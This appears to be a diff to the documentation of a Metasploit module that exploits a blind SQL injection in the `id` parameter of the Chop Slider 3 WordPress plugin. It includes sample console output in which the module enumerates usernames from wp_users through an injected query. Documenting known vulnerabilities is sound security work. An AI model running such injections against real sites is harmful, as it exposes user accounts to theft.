@@ -1,8 +1,8 @@
 ## Vulnerable Application
 
-The iDangero.us Chop Slider 3 WordPress plugin prior to version 3.4
+The iDangero.us Chop Slider 3 WordPress plugin 3.4 and prior
 contains a blind SQL injection in the `id` parameter of the
-`get_sript/index.php` page.  The injection is passed through `GET`
+`get_script/index.php` page.  The injection is passed through `GET`
 parameters, and thus must be encoded, and magic_quotes is applied at the server.
 
 The plugin can be downloaded from
@@ -47,9 +47,7 @@ verbose => true
 resource (chopslider.rb)> set count 3
 count => 3
 resource (chopslider.rb)> run
-[*] Checking /wp-content/plugins/chopslider/readme.txt
-[*] Checking /wp-content/plugins/chopslider/Readme.txt
-[*] Checking /wp-content/plugins/chopslider/README.txt
+[*] Version detected: 3.4
 [+] Vulnerable version detected
 [*] Enumerating Usernames
 [*] {SQLi} Executing (select group_concat(qlJEzvIJY) from (select cast(ifnull(user_login,'') as binary) qlJEzvIJY from wp_users limit 3) DSKc)
